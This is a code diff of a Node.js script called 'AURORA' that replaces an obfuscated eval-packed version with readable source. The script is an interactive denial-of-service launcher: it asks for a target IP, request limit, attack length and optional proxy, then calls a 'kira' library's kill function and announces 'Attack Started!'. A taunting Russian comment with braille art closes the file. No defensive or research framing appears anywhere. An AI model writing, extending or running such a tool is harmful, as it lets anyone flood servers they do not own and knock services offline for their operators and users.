@@ -1,1 +1,218 @@
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('f X=B("1b");f O=1c X();f P=B("P");f{Q}=B("1d");f{C}=B("8");C();8.d("                                                        ");8.d(" ▄▄▄       █    ██  ██▀███   ▒█████   ██▀███   ▄▄▄      ");8.d("▒████▄     ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ");8.d("▒██  ▀█▄  ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ");8.d("░██▄▄▄▄██ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ");8.d(" ▓█   ▓██▒▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒");8.d(" ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░");8.d("  ▒   ▒▒ ░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░");8.d("  ░   ▒    ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   ");8.d("      ░  ░   ░        ░         ░ ░     ░           ░  ░");8.d("                                                        ");Z(1e 6(){1f 10=[{l:"m",o:"R",p:"[7]: 1g D: ",q:6(a){5(!/[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}/.E(a)){2"[7]: r t a 11 D..."}f i=a.F(".").G((4)=>h(4));f j=i.H((4)=>!(4>=0&&4<=I));5(j==J){2 12}},u:6(a){5(!/[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}/.E(a)){2""}f i=a.F(".").G((4)=>h(4));f j=i.H((4)=>!(4>=0&&4<=I));5(j==J){2 a}},},{l:"m",o:"S",p:"[7]: 1h 1i: ",q:6(a){w b=!v(h(a));2 b||"[7]: r t a T..."},u:6(a){5(!v(h(a))){2 a}2""},},{l:"m",o:"U",p:"[7]: 1j: ",q:6(a){w b=!v(h(a));2 b||"[7]: r t a T..."},u:6(a){5(!v(h(a))){2 a}2""},},{l:"m",o:"x",p:"[7]: 1k V? (Y/N) ",q:6(a){w b=a.c()=="y"||a.c()=="n";2 b||"[7]: r t Y/N..."},u:6(a){5(a.c()=="y"||a.c()=="n"){2 a}2""},},{l:"m",o:"13",p:"[7]: V D: ",14:6(a){2 a.x.c()==="y"},q:6(a){5(!/[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}/.E(a)){2"[7]: r t a 11 D..."}f i=a.F(".").G((4)=>h(4));f j=i.H((4)=>!(4>=0&&4<=I));5(j==J){2 12}2 1l},u:6(a){5(!/[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}/.E(a)){2""}f i=a.F(".").G((4)=>h(4));f j=i.H((4)=>!(4>=0&&4<=I));5(j==J){2 a}},},{l:"m",o:"15",p:"[7]: V 1m: ",14:6(a){2 a.x.c()==="y"},q:6(a){w b=!v(h(a));2 b||"[7]: r t a T..."},u:6(a){5(!v(h(a))){2 a}2""},},{l:"m",o:"z",p:"[7]: 1n? (Y/N) ",q:6(a){w b=a.c()=="y"||a.c()=="n";2 b||"[7]: r t Y/N..."},u:6(a){5(a.c()=="y"||a.c()=="n"){2 a}2""},},];f e=1o P.1p(10);5(e.x.c()==="y"){5(e.z.c()==="n"){K(Q,L)}W 5(e.z.c()==="y"){16{K(()=>{C();8.d("[7]: 17 18!");O.19(`${e.R.k(/\\s/g,"")}`,A(e.S.k(/\\s/g,"")),A(e.U.k(/\\s/g,"")),`${e.13.k(/\\s/g,"")}:${A(e.15.k(/\\s/g,""))}`)},L)}1a(M){8.d("[7]: "+M)}}}W 5(e.x.c()==="n"){5(e.z.c()==="n"){K(Q,L)}W 5(e.z.c()==="y"){16{K(()=>{C();8.d("[7]: 17 18!");O.19(`${e.R.k(/\\s/g,"")}`,A(e.S.k(/\\s/g,"")),A(e.U.k(/\\s/g,"")))},L)}1a(M){8.d("[7]: "+M)}}}});6 Z(a){2 a()}',62,88,'||return||val|if|function|AURORA|console||||toLowerCase|log|answers|const||parseFloat|arrNumbers|wrongNumber|replace|type|input||name|message|validate|Please||Enter|filter|isNaN|var|useProxy||start|parseInt|require|clear|IP|test|split|map|find|255|null|setTimeout|1000|err||ddos|inquirer|exit|targetIp|maxLimit|Number|attackLength|Proxy|else|Kira||call|questions|Valide|true|proxyIp|when|proxyPort|try|Attack|Started|kill|catch|kira|new|process|async|let|Target|Max|Limit|Length|Use|false|Port|Start|await|prompt'.split('|'),0,{}))
+const Kira = require("kira");
+const ddos = new Kira();
+const inquirer = require("inquirer");
+const { exit } = require("process");
+const { clear } = require("console");
+
+clear();
+
+console.log("                                                        ");
+console.log(" ▄▄▄       █    ██  ██▀███   ▒█████   ██▀███   ▄▄▄      ");
+console.log("▒████▄     ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ");
+console.log("▒██  ▀█▄  ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ");
+console.log("░██▄▄▄▄██ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ");
+console.log(" ▓█   ▓██▒▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒");
+console.log(" ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░");
+console.log("  ▒   ▒▒ ░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░");
+console.log("  ░   ▒    ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   ");
+console.log("      ░  ░   ░        ░         ░ ░     ░           ░  ░");
+console.log("                                                        ");
+
+call(async function () {
+	let questions = [
+		{
+			type: "input",
+			name: "targetIp",
+			message: "[AURORA]: Target IP: ",
+			validate: function (input) {
+				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
+					return "[AURORA]: Please Enter a Valide IP...";
+				}
+				// [number, number, number, number]
+				const arrNumbers = input.split(".").map((val) => parseFloat(val));
+				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
+				if (wrongNumber == null) {
+					return true;
+				}
+			},
+			filter: function (input) {
+				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
+					return "";
+				}
+				// [number, number, number, number]
+				const arrNumbers = input.split(".").map((val) => parseFloat(val));
+				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
+				if (wrongNumber == null) {
+					return input;
+				}
+			},
+		},
+		{
+			type: "input",
+			name: "maxLimit",
+			message: "[AURORA]: Max Limit: ",
+			validate: function (value) {
+				var valid = !isNaN(parseFloat(value));
+				return valid || "[AURORA]: Please Enter a Number...";
+			},
+			filter: function (input) {
+				if (!isNaN(parseFloat(input))) {
+					return input;
+				}
+				return "";
+			},
+		},
+		{
+			type: "input",
+			name: "attackLength",
+			message: "[AURORA]: Length: ",
+			validate: function (value) {
+				var valid = !isNaN(parseFloat(value));
+				return valid || "[AURORA]: Please Enter a Number...";
+			},
+			filter: function (input) {
+				if (!isNaN(parseFloat(input))) {
+					return input;
+				}
+				return "";
+			},
+		},
+		{
+			type: "input",
+			name: "useProxy",
+			message: "[AURORA]: Use Proxy? (Y/N) ",
+			validate: function (value) {
+				var valid = value.toLowerCase() == "y" || value.toLowerCase() == "n";
+				return valid || "[AURORA]: Please Enter Y/N...";
+			},
+			filter: function (input) {
+				if (input.toLowerCase() == "y" || input.toLowerCase() == "n") {
+					return input;
+				}
+				return "";
+			},
+		},
+		{
+			type: "input",
+			name: "proxyIp",
+			message: "[AURORA]: Proxy IP: ",
+			when: function (value) {
+				return value.useProxy.toLowerCase() === "y";
+			},
+			validate: function (input) {
+				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
+					return "[AURORA]: Please Enter a Valide IP...";
+				}
+				// [number, number, number, number]
+				const arrNumbers = input.split(".").map((val) => parseFloat(val));
+				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
+				if (wrongNumber == null) {
+					return true;
+				}
+				return false;
+			},
+			filter: function (input) {
+				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
+					return "";
+				}
+				// [number, number, number, number]
+				const arrNumbers = input.split(".").map((val) => parseFloat(val));
+				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
+				if (wrongNumber == null) {
+					return input;
+				}
+			},
+		},
+		{
+			type: "input",
+			name: "proxyPort",
+			message: "[AURORA]: Proxy Port: ",
+			when: function (value) {
+				return value.useProxy.toLowerCase() === "y";
+			},
+			validate: function (value) {
+				var valid = !isNaN(parseFloat(value));
+				return valid || "[AURORA]: Please Enter a Number...";
+			},
+			filter: function (input) {
+				if (!isNaN(parseFloat(input))) {
+					return input;
+				}
+				return "";
+			},
+		},
+		{
+			type: "input",
+			name: "start",
+			message: "[AURORA]: Start? (Y/N) ",
+			validate: function (value) {
+				var valid = value.toLowerCase() == "y" || value.toLowerCase() == "n";
+				return valid || "[AURORA]: Please Enter Y/N...";
+			},
+			filter: function (input) {
+				if (input.toLowerCase() == "y" || input.toLowerCase() == "n") {
+					return input;
+				}
+				return "";
+			},
+		},
+	];
+
+	const answers = await inquirer.prompt(questions);
+
+	if (answers.useProxy.toLowerCase() === "y") {
+		if (answers.start.toLowerCase() === "n") {
+			setTimeout(exit, 1000);
+		} else if (answers.start.toLowerCase() === "y") {
+			try {
+				setTimeout(() => {
+					clear();
+					console.log("[AURORA]: Attack Started!");
+					ddos.kill(`${answers.targetIp.replace(/\s/g, "")}`, parseInt(answers.maxLimit.replace(/\s/g, "")), parseInt(answers.attackLength.replace(/\s/g, "")), `${answers.proxyIp.replace(/\s/g, "")}:${parseInt(answers.proxyPort.replace(/\s/g, ""))}`);
+				}, 1000);
+			} catch (err) {
+				console.log("[AURORA]: " + err);
+			}
+		}
+	} else if (answers.useProxy.toLowerCase() === "n") {
+		if (answers.start.toLowerCase() === "n") {
+			setTimeout(exit, 1000);
+		} else if (answers.start.toLowerCase() === "y") {
+			try {
+				setTimeout(() => {
+					clear();
+					console.log("[AURORA]: Attack Started!");
+					ddos.kill(`${answers.targetIp.replace(/\s/g, "")}`, parseInt(answers.maxLimit.replace(/\s/g, "")), parseInt(answers.attackLength.replace(/\s/g, "")));
+				}, 1000);
+			} catch (err) {
+				console.log("[AURORA]: " + err);
+			}
+		}
+	}
+});
+
+function call(fn) {
+	return fn();
+}
+
+/* 
+
+Ты чего забыл тут?
+
+⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄ 
+⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄ 
+⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄ 
+⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄ 
+⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰ 
+⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤ 
+⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗ 
+⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄ 
+⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄ 
+⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄ 
+⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄ 
+⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄ 
+⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄ 
+⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴ 
+⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿ 
+
+*/
